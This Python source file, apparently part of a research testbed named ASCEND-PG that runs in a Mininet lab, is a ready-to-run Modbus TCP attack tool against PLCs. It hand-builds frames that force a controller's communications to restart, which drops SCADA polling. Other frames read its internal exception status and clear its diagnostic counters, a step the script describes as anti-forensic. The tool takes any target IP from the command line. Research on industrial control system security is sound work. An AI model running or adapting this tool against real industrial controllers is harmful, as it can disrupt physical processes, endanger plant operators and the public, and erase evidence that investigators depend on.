#!/usr/bin/env python3
"""
ASCEND-PG attacks/malicious_fc.py

Modbus TCP Command Injection — Malicious & Diagnostic Function Codes.
MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message).
Taxonomy Reference: Morris & Gao (2013) Command Injection.

SCADA and ICS networks typically operate using a restricted subset of Modbus
Function Codes (FC01/02 for discrete reads, FC03/04 for analog reads, FC05/06/15/16
for authorized writes). Diagnostic and supervisory function codes (FC07, FC08)
are rarely used during runtime polling and are often overlooked in standard security
configurations.

This attack script sends crafted diagnostic and supervisory Modbus Function Codes
via a raw TCP socket using hand-built Modbus Application Protocol (MBAP) frames:

1. FC08 (Diagnostics, 0x08) / Sub-function 0x0001 (Restart Communications Option):
   - Commands the PLC's serial/Ethernet communications processor to reboot its comm port.
   - Drops active SCADA polling sessions and can force communication blackout.
   - Action: 'fc08_restart_comms'

2. FC07 (Read Exception Status, 0x07):
   - Queries the PLC's 8-bit internal exception/error status register without touching
     configured holding registers or coils.
   - Leaks internal device health, hardware fault flags, and operational states.
   - Action: 'fc07_exception_status'

3. FC08 (Diagnostics, 0x08) / Sub-function 0x000A (Clear Counters and Diagnostic Register):
   - Clears all internal diagnostic event counters and communication error logs on the PLC.
   - Anti-forensic technique: blinds operators to prior bus errors, collision rates,
     or injection anomalies.
   - Action: 'fc08_clear_counters'

WHY RAW SOCKET & HAND-BUILT MBAP FRAMES:
Like dos_attack.py, raw socket MBAP frames ensure precise byte-level control over
sub-function codes, data fields, and unit IDs without dependency on client library
abstractions or version mismatches.

Usage:
    # Run all malicious function code probes against target PLC:
    python3 attacks/malicious_fc.py --target 10.0.0.1 --action all

    # Execute only communication restart (FC08 sub 0x0001):
    python3 attacks/malicious_fc.py --target 10.0.0.1 --action restart

    # Read internal exception status byte (FC07):
    python3 attacks/malicious_fc.py --target 10.0.0.1 --action exception_status

    # Clear PLC diagnostic counters and error registers (FC08 sub 0x000A):
    python3 attacks/malicious_fc.py --target 10.0.0.1 --action clear_counters

Run this ON THE ATTACKER HOST inside the Mininet topology, e.g.:
    mininet> attacker python3 attacks/malicious_fc.py --target 10.0.0.1 --action all
"""

import argparse
import json
import logging
import socket
import struct
import time
from datetime import datetime, timezone
from pathlib import Path

MODBUS_PORT = 502

# Shared event log store — repo data/ dir, anchored to this file (attacks/ -> repo root)
DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
log = logging.getLogger("malicious_fc")

# Standard Modbus Exception Code lookup table
MODBUS_EXCEPTIONS = {
    1: "ILLEGAL FUNCTION (0x01) — Function code not supported by PLC",
    2: "ILLEGAL DATA ADDRESS (0x02) — Register address out of range",
    3: "ILLEGAL DATA VALUE (0x03) — Value in query data field invalid",
    4: "SLAVE DEVICE FAILURE (0x04) — Unrecoverable error occurred in PLC",
    5: "ACKNOWLEDGE (0x05) — Request accepted, long duration operation",
    6: "SLAVE DEVICE BUSY (0x06) — PLC engaged in long duration command",
    8: "MEMORY PARITY ERROR (0x08) — Parity error reading extended memory",
    10: "GATEWAY PATH UNAVAILABLE (0x0A) — Gateway misconfigured/overloaded",
    11: "GATEWAY TARGET DEVICE FAILED TO RESPOND (0x0B) — No response from device",
}


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (list of dicts)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            events = []
    events.append(event)
    try:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        log_path.write_text(json.dumps(events, indent=2), encoding="utf-8")
    except OSError as exc:
        log.error("Failed to write to log store %s: %s", log_path, exc)


def build_fc08_frame(tx_id: int, unit_id: int, subfunction: int, data: int = 0x0000) -> bytes:
    """
    Hand-build a Modbus/TCP FC08 (Diagnostics) request frame.

    MBAP Header (7 bytes):
      - Transaction ID (2 bytes, big-endian)
      - Protocol ID    (2 bytes, 0x0000 = Modbus)
      - Length         (2 bytes, = 1 [unit_id] + 5 [PDU])
      - Unit ID        (1 byte)
    PDU (5 bytes):
      - Function Code  (1 byte, 0x08)
      - Sub-function   (2 bytes, big-endian)
      - Data Field     (2 bytes, big-endian)
    """
    pdu = struct.pack(">BHH", 0x08, subfunction, data)
    length = 1 + len(pdu)  # 6 bytes
    mbap = struct.pack(">HHHB", tx_id, 0, length, unit_id)
    return mbap + pdu


def build_fc07_frame(tx_id: int, unit_id: int) -> bytes:
    """
    Hand-build a Modbus/TCP FC07 (Read Exception Status) request frame.

    MBAP Header (7 bytes):
      - Transaction ID (2 bytes, big-endian)
      - Protocol ID    (2 bytes, 0x0000 = Modbus)
      - Length         (2 bytes, = 1 [unit_id] + 1 [PDU])
      - Unit ID        (1 byte)
    PDU (1 byte):
      - Function Code  (1 byte, 0x07)
    """
    pdu = struct.pack(">B", 0x07)
    length = 1 + len(pdu)  # 2 bytes
    mbap = struct.pack(">HHHB", tx_id, 0, length, unit_id)
    return mbap + pdu


def send_raw_mbap_request(ip: str, port: int, frame: bytes, expected_fc: int,
                          timeout: float = 5.0) -> dict:
    """
    Open a raw TCP socket, transmit the MBAP frame, and receive/parse the response.
    Handles both normal responses and Modbus exception responses (FC | 0x80).
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    try:
        sock.connect((ip, port))
        sock.sendall(frame)

        # Read 7-byte MBAP header first
        resp_mbap = sock.recv(7)
        if len(resp_mbap) < 7:
            return {
                "success": False,
                "error": "Truncated MBAP header received",
                "bytes_received": resp_mbap.hex(),
            }

        resp_tx_id, resp_proto, resp_length, resp_unit_id = struct.unpack(">HHHB", resp_mbap)

        # Read remaining PDU bytes indicated by resp_length - 1
        pdu_len = max(0, resp_length - 1)
        resp_pdu = b""
        while len(resp_pdu) < pdu_len:
            chunk = sock.recv(pdu_len - len(resp_pdu))
            if not chunk:
                break
            resp_pdu += chunk

        if not resp_pdu:
            return {
                "success": False,
                "error": "No PDU received in response",
                "mbap_header": {
                    "tx_id": resp_tx_id,
                    "proto": resp_proto,
                    "length": resp_length,
                    "unit_id": resp_unit_id,
                },
            }

        resp_fc = resp_pdu[0]

        # Check for Modbus Exception Response (FC | 0x80)
        if resp_fc == (expected_fc | 0x80):
            exc_code = resp_pdu[1] if len(resp_pdu) > 1 else 0
            exc_desc = MODBUS_EXCEPTIONS.get(exc_code, f"Unknown Exception Code {exc_code}")
            log.warning("PLC returned Modbus Exception (FC 0x%02X): %s", resp_fc, exc_desc)
            return {
                "success": False,
                "is_modbus_exception": True,
                "exception_code": exc_code,
                "exception_description": exc_desc,
                "raw_response": (resp_mbap + resp_pdu).hex(),
                "unit_id": resp_unit_id,
            }

        # Normal Response
        parsed = {
            "success": True,
            "is_modbus_exception": False,
            "response_fc": resp_fc,
            "unit_id": resp_unit_id,
            "raw_response": (resp_mbap + resp_pdu).hex(),
        }

        if expected_fc == 0x07 and len(resp_pdu) >= 2:
            exc_status_byte = resp_pdu[1]
            parsed["exception_status_byte"] = exc_status_byte
            parsed["exception_status_hex"] = f"0x{exc_status_byte:02X}"
            parsed["exception_status_bin"] = f"{exc_status_byte:08b}"
        elif expected_fc == 0x08 and len(resp_pdu) >= 5:
            _, subfunc, data_field = struct.unpack(">BHH", resp_pdu[:5])
            parsed["subfunction"] = subfunc
            parsed["subfunction_hex"] = f"0x{subfunc:04X}"
            parsed["data_field"] = data_field
            parsed["data_field_hex"] = f"0x{data_field:04X}"

        return parsed

    except socket.timeout:
        log.warning("Socket timeout waiting for response from %s:%d", ip, port)
        return {"success": False, "error": f"Timeout after {timeout}s"}
    except ConnectionRefusedError:
        log.error("Connection refused to %s:%d", ip, port)
        return {"success": False, "error": "Connection refused"}
    except Exception as exc:
        log.error("Socket communication error with %s:%d: %s", ip, port, exc)
        return {"success": False, "error": str(exc)}
    finally:
        try:
            sock.close()
        except OSError:
            pass


def execute_restart_comms(target: str, port: int = MODBUS_PORT, unit_id: int = 1,
                          clear_event_log: bool = False, timeout: float = 5.0,
                          log_path: Path = DEFAULT_LOG) -> dict:
    """
    FC08 / Sub-function 0x0001: Restart Communications Option.
    Commands the target PLC to restart its communications subsystem.
    Data=0x0000: Restart comms port without clearing event log.
    Data=0xFF00: Restart comms port and clear comms event log.
    """
    subfunction = 0x0001
    data_val = 0xFF00 if clear_event_log else 0x0000
    tx_id = 0x0801
    frame = build_fc08_frame(tx_id=tx_id, unit_id=unit_id, subfunction=subfunction, data=data_val)

    log.info("Sending FC08 Sub-0x0001 (Restart Communications) to %s:%d (unit=%d, data=0x%04X)",
             target, port, unit_id, data_val)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "fc08_restart_comms",
        "status": "started",
        "target": target,
        "port": port,
        "unit_id": unit_id,
        "subfunction": f"0x{subfunction:04X}",
        "data": f"0x{data_val:04X}",
        "clear_event_log": clear_event_log,
    })

    result = send_raw_mbap_request(target, port, frame, expected_fc=0x08, timeout=timeout)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "fc08_restart_comms",
        "status": "completed" if result.get("success") else "failed",
        "target": target,
        "port": port,
        "result": result,
    })

    if result.get("success"):
        log.info("FC08 Restart Communications acknowledged by %s:%d: subfunc=0x%04X, data=0x%04X",
                 target, port, result.get("subfunction", 0), result.get("data_field", 0))
    else:
        log.warning("FC08 Restart Communications result on %s:%d: %s",
                    target, port, result.get("error") or result.get("exception_description"))

    return result


def execute_read_exception_status(target: str, port: int = MODBUS_PORT,
                                  unit_id: int = 1, timeout: float = 5.0,
                                  log_path: Path = DEFAULT_LOG) -> dict:
    """
    FC07: Read Exception Status.
    Queries the 8-bit internal PLC exception/error register.
    """
    tx_id = 0x0701
    frame = build_fc07_frame(tx_id=tx_id, unit_id=unit_id)

    log.info("Sending FC07 (Read Exception Status) to %s:%d (unit=%d)",
             target, port, unit_id)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "fc07_exception_status",
        "status": "started",
        "target": target,
        "port": port,
        "unit_id": unit_id,
    })

    result = send_raw_mbap_request(target, port, frame, expected_fc=0x07, timeout=timeout)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "fc07_exception_status",
        "status": "completed" if result.get("success") else "failed",
        "target": target,
        "port": port,
        "result": result,
    })

    if result.get("success"):
        status_byte = result.get("exception_status_byte", 0)
        log.info("FC07 Read Exception Status response from %s:%d: byte=0x%02X (bin=%08b)",
                 target, port, status_byte, status_byte)
    else:
        log.warning("FC07 Read Exception Status result on %s:%d: %s",
                    target, port, result.get("error") or result.get("exception_description"))

    return result


def execute_clear_counters(target: str, port: int = MODBUS_PORT, unit_id: int = 1,
                           timeout: float = 5.0, log_path: Path = DEFAULT_LOG) -> dict:
    """
    FC08 / Sub-function 0x000A: Clear Counters and Diagnostic Register.
    Clears all internal diagnostic counters and diagnostic register on the PLC.
    """
    subfunction = 0x000A
    data_val = 0x0000
    tx_id = 0x080A
    frame = build_fc08_frame(tx_id=tx_id, unit_id=unit_id, subfunction=subfunction, data=data_val)

    log.info("Sending FC08 Sub-0x000A (Clear Counters) to %s:%d (unit=%d)",
             target, port, unit_id)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "fc08_clear_counters",
        "status": "started",
        "target": target,
        "port": port,
        "unit_id": unit_id,
        "subfunction": f"0x{subfunction:04X}",
    })

    result = send_raw_mbap_request(target, port, frame, expected_fc=0x08, timeout=timeout)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "fc08_clear_counters",
        "status": "completed" if result.get("success") else "failed",
        "target": target,
        "port": port,
        "result": result,
    })

    if result.get("success"):
        log.info("FC08 Clear Counters acknowledged by %s:%d: counters reset", target, port)
    else:
        log.warning("FC08 Clear Counters result on %s:%d: %s",
                    target, port, result.get("error") or result.get("exception_description"))

    return result


def execute_all(target: str, port: int = MODBUS_PORT, unit_id: int = 1,
                timeout: float = 5.0, log_path: Path = DEFAULT_LOG) -> dict:
    """
    Execute all three malicious function code attacks in sequence.
    """
    log.info("=== Running Malicious Function Code Suite against %s:%d ===", target, port)

    res_fc07 = execute_read_exception_status(target, port=port, unit_id=unit_id, timeout=timeout, log_path=log_path)
    time.sleep(0.5)

    res_fc08_clear = execute_clear_counters(target, port=port, unit_id=unit_id, timeout=timeout, log_path=log_path)
    time.sleep(0.5)

    res_fc08_restart = execute_restart_comms(target, port=port, unit_id=unit_id, clear_event_log=False, timeout=timeout, log_path=log_path)

    summary = {
        "target": target,
        "port": port,
        "unit_id": unit_id,
        "read_exception_status": res_fc07,
        "clear_counters": res_fc08_clear,
        "restart_comms": res_fc08_restart,
    }

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "malicious_fc_suite_completed",
        "target": target,
        "summary": summary,
    })

    return summary


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Malicious Modbus Function Codes (MITRE ICS T0855)"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP address (e.g., 10.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=MODBUS_PORT,
                        help=f"Modbus TCP port (default: {MODBUS_PORT})")
    parser.add_argument("--action", choices=["restart", "exception_status", "clear_counters", "all"],
                        default="all",
                        help="Malicious action to perform: restart (FC08 sub 0x0001), "
                             "exception_status (FC07), clear_counters (FC08 sub 0x000A), or all (default: all)")
    parser.add_argument("--unit", type=int, default=1,
                        help="Modbus Unit ID / Device ID (default: 1)")
    parser.add_argument("--timeout", type=float, default=5.0,
                        help="Socket timeout in seconds (default: 5.0)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help=f"Path to shared JSON log store (default: {DEFAULT_LOG})")

    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    if args.action == "restart":
        execute_restart_comms(args.target, port=args.port, unit_id=args.unit,
                              timeout=args.timeout, log_path=log_path)
    elif args.action == "exception_status":
        execute_read_exception_status(args.target, port=args.port, unit_id=args.unit,
                                      timeout=args.timeout, log_path=log_path)
    elif args.action == "clear_counters":
        execute_clear_counters(args.target, port=args.port, unit_id=args.unit,
                               timeout=args.timeout, log_path=log_path)
    elif args.action == "all":
        execute_all(args.target, port=args.port, unit_id=args.unit,
                    timeout=args.timeout, log_path=log_path)


if __name__ == "__main__":
    main()
